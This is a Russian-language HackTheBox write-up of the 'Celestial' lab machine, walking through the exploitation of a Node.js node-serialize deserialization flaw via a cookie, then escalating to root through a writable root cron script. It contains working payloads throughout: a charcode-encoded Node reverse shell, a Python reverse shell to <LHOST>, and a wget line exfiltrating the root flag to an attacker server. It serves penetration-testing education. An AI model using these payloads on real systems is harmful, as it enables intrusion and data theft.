---
layout: post
title: "HTB: Celestial Write-Up"
date: 2018-08-25 20:00:00 +0300
author: snovvcrash
categories: ctf write-ups boxes hackthebox
tags: [ctf, write-ups, boxes, hackthebox, Celestial, node-js, rce, deserialization, python, cron]
comments: true
---

[![celestial.png]({{ "/img/htb/boxes/celestial.png" | relative_url }})]({{ page.url }})

**Celestial** — образцовый представитель типичной CTF-машины. Уязвимый web-сервис дает возможность удаленного выполнения кода (RCE), открывая путь к получению reverse-shell'а, откуда до повышения привилегий до суперпользователя (LPE) в силу небрежно выставленных настроек прав доступа рукой подать. Let's dive into it!

<!--cut-->

<h4>Celestial: 10.10.10.85</h4>

* TOC
{:toc}

# nmap
Начинаем со сканирования, разведка — наше все. По традиции сначала быстрое stealth-сканирование для получения общей картины:
```
root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.85
Nmap scan report for 10.10.10.85
Host is up, received user-set (0.066s latency).
Scanned at 2018-08-24 16:11:57 EDT for 1s
Not shown: 993 closed ports
Reason: 993 resets
PORT      STATE    SERVICE   REASON
1277/tcp  filtered miva-mqs  no-response
1658/tcp  filtered sixnetudr no-response
2492/tcp  filtered groove    no-response
3000/tcp  open     ppp       syn-ack ttl 63
8193/tcp  filtered sophos    no-response
10082/tcp filtered amandaidx no-response
32783/tcp filtered unknown   no-response

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Aug 24 16:11:58 2018 -- 1 IP address (1 host up) scanned in 1.26 seconds
```

Потом собираем больше информации о приложениях на открытых портах:
```
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version -p3000 10.10.10.85
Nmap scan report for 10.10.10.85
Host is up, received echo-reply ttl 63 (0.055s latency).
Scanned at 2018-08-24 16:12:49 EDT for 14s

PORT     STATE SERVICE REASON         VERSION
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 24 16:13:03 2018 -- 1 IP address (1 host up) scanned in 15.05 seconds
```

Итак, *Node.js Express framework* на 3000-м порту. Посмотрим, что за зверь такой, и как к нему подобраться.

# Web — Порт 3000
## Браузер
Ради интереса посмотрим, что скажет браузер. При загрузке страницы в первый раз нас ждет просто сухой циничный маркер пустоты и безысходности, обличенный в жирные цифры **4**, **0**, **4**:

[![celestial-port3000-browser-1.png]({{ "/img/htb/boxes/celestial-port3000-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial-port3000-browser-1.png" | relative_url }})

Если быть настойчивее и обновить страничку, нас встретит очень ценное замечание:

[![celestial-port3000-browser-2.png]({{ "/img/htb/boxes/celestial-port3000-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial-port3000-browser-2.png" | relative_url }})

Что-то здесь не так, потому что `2 + 2 is 4`, это я точно помню... Будем смотреть на запрос.

## Burp Suite
Перехватим запрос и посмотрим, что под капотом:

[![celestial-port3000-burp-1.png]({{ "/img/htb/boxes/celestial-port3000-burp-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial-port3000-burp-1.png" | relative_url }})

Cookie с профилем. Это объясняет, почему в первый раз пришло сообщение об ошибке (первый запрос был без печенек). Посмотрим, что представляет из себя значение профиля:
```
root@kali:~# base64 -d <<< 'eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ=='
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

Что ж, использование cookie со стороны web-сервиса — уже большое поле для творчества, пора выяснить слабые места фреймворка.

## Node.js deserialization bug
Обратимся ко всемирной паутине за помощью. Интернет подсказывает, что *Node.js Express framework* имеет уязвимость в модуле сериализации данных (версии ⩽ 0.0.4) для Node.js за номером [CVE-2017-5941](https://nvd.nist.gov/vuln/detail/CVE-2017-5941 "NVD - CVE-2017-5941"), которая открывает атакующему возможность удаленного выполнения кода. Подробнее о механизме уязвимости можно почитать [здесь](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf "41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf").

То, что нам нужно! Проверим возможность эксплуатации.

## Proof-of-Concept
Для начала небольшой PoC-тест: особенность уязвимости позволяет выполнить произвольную js-функцию на машине жертвы, но не получить *вывод этой функции*, поэтому для доказательства возможности эксплуатации выберем то, "что нельзя увидеть, но можно почувствовать", i. e. попробуем пропинговать Kali-машину с сервера. Для этого соберем payload:
```
{"rce": "_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 2 <LHOST>',function(error,stdout,stderr){console.log(stdout)});}()"}
```

Создание зловредного cookie почти завершено, только добавим в словарь ключи из оригинального значения профиля (на всякий случай даже те, которые явно не участвуют в ответе) и закодируем base64 (силами Burp Decoder'а, чтобы не мучиться с escape-символами в терминале):
```
{"username": "3v3l_h4ck3r", "country": "Shangri-La", "city": "Civitas Solis", "num": "13373", "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 2 <LHOST>',function(error,stdout,stderr){console.log(stdout)});}()"}

eyJ1c2VybmFtZSI6ICIzdjNsX2g0Y2szciIsICJjb3VudHJ5IjogIlNoYW5ncmktTGEiLCAiY2l0eSI6ICJDaXZpdGFzIFNvbGlzIiwgIm51bSI6ICIxMzM3MyIsICJyY2UiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3BpbmcgLWMgMiA8TEhPU1Q+JyxmdW5jdGlvbihlcnJvcixzdGRvdXQsc3RkZXJyKXtjb25zb2xlLmxvZyhzdGRvdXQpfSk7fSgpIn0=
```

Поставим tcpdump слушать нужный интерфейс на ICMP-пакеты и выстрелим запросом из Burp:
```
root@kali:~# tcpdump -vv -i tun0 icmp
tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
07:47:06.901111 IP (tos 0x0, ttl 63, id 51198, offset 0, flags [DF], proto ICMP (1), length 84)
    10.10.10.85 > kali: ICMP echo request, id 5880, seq 1, length 64
07:47:06.901131 IP (tos 0x0, ttl 64, id 36086, offset 0, flags [none], proto ICMP (1), length 84)
    kali > 10.10.10.85: ICMP echo reply, id 5880, seq 1, length 64
^C
2 packets captured
2 packets received by filter
0 packets dropped by kernel
```

Получили 2 пинга, значит все по плану. Переходим к боевым действиям.

## Reverse-Shell
Я использовал [этот](https://github.com/hoainam1989/training-application-security/blob/master/shell/node_shell.py "training-application-security/node_shell.py at master · hoainam1989/training-application-security") скрипт для генерации reverse-shell'а. Он кодирует строку пейлоада в ASCII-коды, чтобы избежать путаниц с bad-символами (кавычки, слэши и т. д.), а при выполнении на сервере будет использована функция *String.fromCharCode*, которая выполнит обратное преобразование.

Сгенерируем нагрузку:
```
root@kali:~# python node_shell.py -h <LHOST> -p 31337 -r -e -o
=======> Happy hacking <======

{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,32,32,32,32,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,32,32,32,32,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,32,32,32,32,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,32,32,32,32,80,79,82,84,61,34,51,49,51,51,55,34,59,10,32,32,32,32,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,32,32,32,32,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,32,32,32,32,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,10,32,32,32,32,99,40,72,79,83,84,44,80,79,82,84,41,59,10,32,32,32,32))}()"}
```

Опять модифицируем пейлоад под конкретную ситуацию (добавляем ключи из "легитимного" профиля):
```
{"username": "3v3l_h4ck3r", "country": "Shangri-La", "city": "Civitas Solis", "num": "13373", "run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,32,32,32,32,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,32,32,32,32,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,32,32,32,32,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,32,32,32,32,80,79,82,84,61,34,51,49,51,51,55,34,59,10,32,32,32,32,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,32,32,32,32,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,32,32,32,32,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,10,32,32,32,32,99,40,72,79,83,84,44,80,79,82,84,41,59,10,32,32,32,32))}()"}
```

Переводим в base64 и отправляем в Burp (не забыв при этом поднять слушателя на фоне на 31337 порт):

[![celestial-port3000-burp-2.png]({{ "/img/htb/boxes/celestial-port3000-burp-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial-port3000-burp-2.png" | relative_url }})

# Внутри машины
А тем временем:
```
root@kali:~# nc -nlvvp 31337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.10.10.85.
Ncat: Connection from 10.10.10.85:32968.
Connected!

ls
Desktop
Documents
Downloads
examples.desktop
Music
node_modules
output.txt
Pictures
Public
server.js
Templates
Videos
```

Есть контакт. Апгрейдим полученный шелл до удобного tty bash'а, чтобы можно было пользоваться автодобиванием по TAB'у, CTRL-C не убивал бы наш прогресс и т. д.:
```
python -c 'import pty; pty.spawn("/bin/bash")'
sun@sun:~$ ^Z
[1]  + 4084 suspended  nc -nlvvp 31337
root@kali:~# stty raw -echo; fg
[1]  + 4084 continued  nc -nlvvp 31337

sun@sun:~$ ls
Desktop    Downloads         Music         output.txt  Public     Templates
Documents  examples.desktop  node_modules  Pictures    server.js  Videos
```

Ну вот, совсем другое дело! Познакомимся с системой, куда вломились:
```
sun@sun:~$ whoami
sun

sun@sun:~$ id
uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

sun@sun:~$ uname -a
Linux sun 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

## user.txt
Заберем флаг пользователя:
```
sun@sun:~$ cat /home/sun/Documents/user.txt
9a093cd2????????????????????????
```

И обдумаем PrivEsc-план. Для начала посмотрим, что в домашнем каталоге:
```
sun@sun:~$ ls -la
total 152
drwxr-xr-x 21 sun  sun  4096 Aug 24 19:20 .
drwxr-xr-x  3 root root 4096 Sep 19  2017 ..
-rw-------  1 sun  sun     1 Mar  4 15:24 .bash_history
-rw-r--r--  1 sun  sun   220 Sep 19  2017 .bash_logout
-rw-r--r--  1 sun  sun  3771 Sep 19  2017 .bashrc
drwx------ 13 sun  sun  4096 Nov  8  2017 .cache
drwx------ 16 sun  sun  4096 Sep 20  2017 .config
drwx------  3 root root 4096 Sep 21  2017 .dbus
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Desktop
-rw-r--r--  1 sun  sun    25 Sep 19  2017 .dmrc
drwxr-xr-x  2 sun  sun  4096 Mar  4 15:08 Documents
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Downloads
-rw-r--r--  1 sun  sun  8980 Sep 19  2017 examples.desktop
drwx------  2 sun  sun  4096 Sep 21  2017 .gconf
drwx------  3 sun  sun  4096 Aug 24 19:20 .gnupg
drwx------  2 root root 4096 Sep 21  2017 .gvfs
-rw-------  1 sun  sun  6732 Aug 24 19:20 .ICEauthority
drwx------  3 sun  sun  4096 Sep 19  2017 .local
drwx------  4 sun  sun  4096 Sep 19  2017 .mozilla
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Music
drwxrwxr-x  2 sun  sun  4096 Sep 19  2017 .nano
drwxr-xr-x 47 root root 4096 Sep 19  2017 node_modules
-rw-rw-r--  1 sun  sun    20 Sep 19  2017 .node_repl_history
drwxrwxr-x 57 sun  sun  4096 Sep 19  2017 .npm
-rw-r--r--  1 root root   21 Aug 24 19:40 output.txt
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Pictures
-rw-r--r--  1 sun  sun   655 Sep 19  2017 .profile
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Public
-rw-rw-r--  1 sun  sun    66 Sep 20  2017 .selected_editor
-rw-rw-r--  1 sun  sun   870 Sep 20  2017 server.js
-rw-r--r--  1 sun  sun     0 Sep 19  2017 .sudo_as_admin_successful
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Templates
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Videos
-rw-------  1 sun  sun    48 Aug 24 19:20 .Xauthority
-rw-------  1 sun  sun    82 Aug 24 19:20 .xsession-errors
-rw-------  1 sun  sun  1302 Mar  7 08:33 .xsession-errors.old
```

В истории пусто:
```
sun@sun:~$ cat .bash_history

```

Сразу в глаза бросается файл `output.txt` неизвестной природы. Владелец — root, читать могут все. Почитаем, раз разрешают:
```
sun@sun:~$ cat output.txt
Script is running...
```

Хмм, говорят, скрипт где-то бегает. Немного поискав, находим такой файл:
```
sun@sun:~$ ls -la Documents | grep script.py
-rwxrwxrwx  1 sun  sun    29 Sep 21  2017 script.py
```

Который изменять может кто угодно, а внутри:
```
sun@sun:~$ cat Documents/script.py
print "Script is running..."
```

Решение почти есть, осталось только глянуть еще одну вещь для полной уверенности. Посмотрим на системные логи (листинг большой, поэтому только важная для нас часть):
```
sun@sun:~$ cat /var/log/syslog
...
Aug 24 19:25:01 sun CRON[4439]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
...
Aug 24 19:30:01 sun CRON[4496]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
...
Aug 24 19:35:01 sun CRON[4552]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
...
Aug 24 19:40:01 sun CRON[4629]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
...
```

Что и требовалось доказать — `cron`, демон линуксоидного планировщика, запускает скрипт `/home/sun/Documents/script.py` каждые 5 минут с привилегиями суперпользователя, а результат работы скрипта записывает в `/home/sun/output.txt`. В то же время редактировать запускаемый скрипт может кто угодно, но каждые 5 минут он перезаписывается исходным содержимым, хранящимся в `/root/script.py` и доступным только для root'а.

Дальше все зависит только от твоей изобретательности. В рамках этого поста я покажу 2 способа, как можно ~~поиметь~~ заполучить желаемый флаг привилегированного пользователя.

## PrivEsc: sun 🡒 root. Способ 1
Для начала предлагаю получить полноценный root-шелл, чтобы честно сказать, что мы полностью захватили машину. Для этого, не мудрствуя лукаво, перезапишем `script.py` стандартным для Пайтона reverse-shell'ом:
```
sun@sun:~$ echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()' > Documents/script.py
```

И ждем коннекта на listener'е:
```
root@kali:~# nc -nlvvp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.85.
Ncat: Connection from 10.10.10.85:44328.

root@sun:~# whoami
root

root@sun:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### root.txt
После этого можно забирать флаг:
```
root@sun:~# cat /root/root.txt
ba1d0019????????????????????????
```

И в качестве бонуса посмотреть суперпользовательский `crontab` (разберем его подробнее в [конце]({{ page.url }}#cron) райтапа):
```
root@sun:~# crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/5 * * * * python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py
```

За сим все, машина наша.

## PrivEsc: sun 🡒 root. Способ 2
Чтобы не мучиться с реверс-шеллом, можно прибегнуть к хитрости. Для начала запустим на Kali-машине локальный HTTP-сервер (простого питоновского будет достаточно):
```
root@kali:~/tmp# python -m SimpleHTTPServer 8888
Serving HTTP on 0.0.0.0 port 8888 ...

```

После чего с машины-жертвы сделаем попытку скачать несуществующий файл, имеющий название, совпадающее с содержимым флага root'а:
```
sun@sun:~$ echo 'import os;os.system("wget http://<LHOST>:8888/$(cat /root/root.txt)");print "f4ckU!"' > Documents/script.py
```

### root.txt
Ждем ⩽ 5 минут, и, о чудо:
```
Serving HTTP on 0.0.0.0 port 8888 ...
10.10.10.85 - - [24/Aug/2018 22:25:02] code 404, message File not found
10.10.10.85 - - [24/Aug/2018 22:25:02] "GET /ba1d0019???????????????????????? HTTP/1.1" 404 -
```

Мы спровоцировали ошибку, получив при этом содержимое нужного файла. Полюбуемся теперь на собственное хулиганство (и одновременно доказательство того, что скрипт успешно отработал до конца):
```
sun@sun:~$ cat output.txt
f4ckU!
```

# Разное
## server.js
Для общего развития можно посмотреть на `/home/sun/server.js`, отвечающий за все безобразие, которое происходило на web'е:
```javascript
// server.js

var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())

app.get('/', function(req, res) {
  if (req.cookies.profile) {
    var str = new Buffer(req.cookies.profile, 'base64').toString();
    var obj = serialize.unserialize(str);
    if (obj.username) { 
      var sum = eval(obj.num + obj.num);
      res.send("Hey " + obj.username + " " + obj.num + " + " + obj.num + " is " + sum);
    }else{
      res.send("An error occurred...invalid username type"); 
    }
  }else {
    res.cookie('profile', "eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==", {
      maxAge: 900000,
      httpOnly: true
    });
  }
  res.send("<h1>404</h1>");
});

app.listen(3000);
```

Из листинга видно, что при отсутствии cookies'ов сервер выплюнет сообщение **404**.

## cron
Будучи root'ом, изучим задание cron'а:
```
root@sun:~# crontab -l | grep -vF '#'
*/5 * * * * python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py
```

Помимо выполнения скрипта, перезаписи его оригинальным содержимым (что обсуждалось ранее), смены владельца и снятия атрибута immutable планировщик также подменяет дату модификации скрипта, чтобы его частое (ежепятиминутное) изменение нелья было определить по временной метке файла. Это делается с помощью утилиты `touch`, которой в качестве аргумента передается значение timestamp'а файла `user.txt` в формате RFC 5322.

Все, что хотел, сказал, спасибо за внимание :innocent:

# Вместо заключения
Вот и вырисовывается типичная схема уязвимой машины ("игрушечной", разумеется):
```
Web RCE ⟶ Reverse shell ⟶ LPE до user'а ⟶ LPE до root'а
```

Здесь даже пропущено одно звено, т. к. первичный уязвимый сервис — фреймворк web-приложений, запущенный с привилегиями пользователя. Не то, что бы такие машины были плохими, вовсе нет. Просто будь готов, что достаточно скоро боксы, выстроенные по такой схеме, станут тебе скучны :unamused:
